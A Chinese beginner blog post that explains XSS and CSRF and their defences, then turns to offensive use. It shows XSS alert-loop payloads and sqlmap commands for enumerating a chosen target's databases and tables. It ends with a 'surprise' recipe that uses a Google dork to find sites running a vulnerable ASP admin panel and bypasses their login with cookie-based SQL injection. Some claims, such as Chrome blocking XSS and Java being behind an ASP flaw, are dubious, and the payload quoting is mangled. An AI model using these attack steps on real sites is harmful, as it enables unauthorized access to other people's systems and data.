## 初识web安全之XSS与CRSF

#### 一、XSS的定义与分类

##### 1.1、XSS定义：

跨站脚本攻击（Cross Site Scripting ）攻击者通过非法的html标签或者javascript代码，从而控制浏览器；

##### 1.2、XSS的分类：大致分为三类DOM型 、反射型、存储型

一、DOM xss：即dom对象，允许程序和脚本动态的访问和更新文档内容，样式，结构等，触发xss完全依靠浏览器的dom解析们可以认为完全是客户端的行为，如（虚假表单，收录私人信息）

二、反射型xss:非持久性的xss，即xss代码直接出现在url中，最后提交到服务器，服务器解析这个xss代码，最后被浏览器执行，如利用脚本获取cookie信息，然后偷偷的发送恶意请求ps:(小广告别乱点)

三、存储型 xss：又称为持久性XSS（最危险的跨站脚本），具有更高的隐蔽性，凡是允许用户存储数据的web程序都可能存在存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，当所有浏览者访问某个页面时都会被XSS，其中最典型的例子就是留言板。

##### 1.3、XSS的一些常见案例

在评论区的富文本框中写上写小玩意儿试试：

```
<font size =“100”color=“red”> 来啊!造作啊!</font>
<script>while(true){alert(‘来啊，造作啊！’)}</script> //如下图

```

![1539184911561](C:\Users\JAMESX~1\AppData\Local\Temp\1539184911561.png)

![1539184994661](C:\Users\JAMESX~1\AppData\Local\Temp\1539184994661.png)

##### 1.4、XSS攻击的防御 

其实只要在有数据输入的地方就有存在XSS的风险，所以防范方法大概如下

1、后台程序httpOnly去设置cookie后，js的脚本就无法读取cookie的信息，如koa 中ctx.cookies.set(name,value,{httpOnly:true})

2、对输入的数据格式进行检查，前后端都要做。在某些情况下不能严格的过滤是，需要对标签进行转换，如 <  &lt; > &gt &lt等

总结：其实在谷歌浏览器是自动屏蔽了xss的攻击。例如我们在url中添加

```
？XSS=<script>while(true){alert(“来啊，造作啊”)}</script>）
```

这个浏览器会自动认为是不合法的。在安全方面其实前端和后端应该协同起来，对用户输入的内容校验。尽量去避免自己的网站作品被黑客轻易的攻下。

#### 二、CSRF的定义与XSS的区别

##### 2.1、CSRF的定义：

跨站点请求伪造（cross-site Request Forgeries）,在用户不知情的情况下，冒充用户发起一些恶意请求。例如（修改用户信息，删除评论，发起转账等行为

##### 2.2、CSRF和XSS的区别：

CSRF通常是由XSS实现的，本质上讲，XSS是因为输入的内容被恶意代码被注入，CSRF：则是因为服务器过度相信用户的会话cookie，因为cookie是具有同源策略，点击小广告，然后你的cookie就别携带到了黑客的界面，界面里面怎么弄那就是他的领地了，所以小广告别乱点。 

##### 2.3、一些CSRF的防御策略

1、验证码：强制用户进行交互才能完成请求，但是用户体验差，比如你的小飞机验证

2、尽量使用post，至少请求内容不能随意被篡改。

3、允许域名的白名单，其他都屏蔽掉。

4、推荐和常用的方法：token后端随机生成token，把token保存到session,前端携带token，后端验证，但是网站本身存在xss的漏洞，这都是笑话

##### 三、一些常用的爆破工具

##### 3.1、sqlmap,这个在github上有资源。环境python

使用方法：寻找到你的目标网站，一般是什么PHP?id=12**这一类的

 python sqlmap.py -u "http://[你的站点域名]/about.php?id=1*" --batch 

--batch –current-db  //查看数据库的版本信息

--batch –D sailodln_main –tables  //查看表名

--batch -D sailodln_main -T  表名 –columns//查看表中的字段

--force-ssl //忽略https

--threads=0~10 //开启多线程模式

##### 3.2、 WebRobot，作用进行端口扫描，C段，注入扫描等 

![1539186211264](C:\Users\JAMESX~1\AppData\Local\Temp\1539186211264.png)

##### 4、小惊喜

1、百度搜索：inurl:szwyadmin/login.asp” （目标网站）

在控制台中输入

1、 document.cookie="adminuser="+escape("'or'='or’”)

2、 document.cookie="adminpass="+escape("'or'='or’”)

3、 document.cookie="admindj="+escape("1")

 然后 重新进入该网站。并把地址栏的 login.asp 改为 admin_index.asp，回车一下我们就进入后台管理了！ps:(利用了框架中自带的弊端，这也许就是java和其他后台语言相比能够一路高歌猛进的一部分原因吧！)



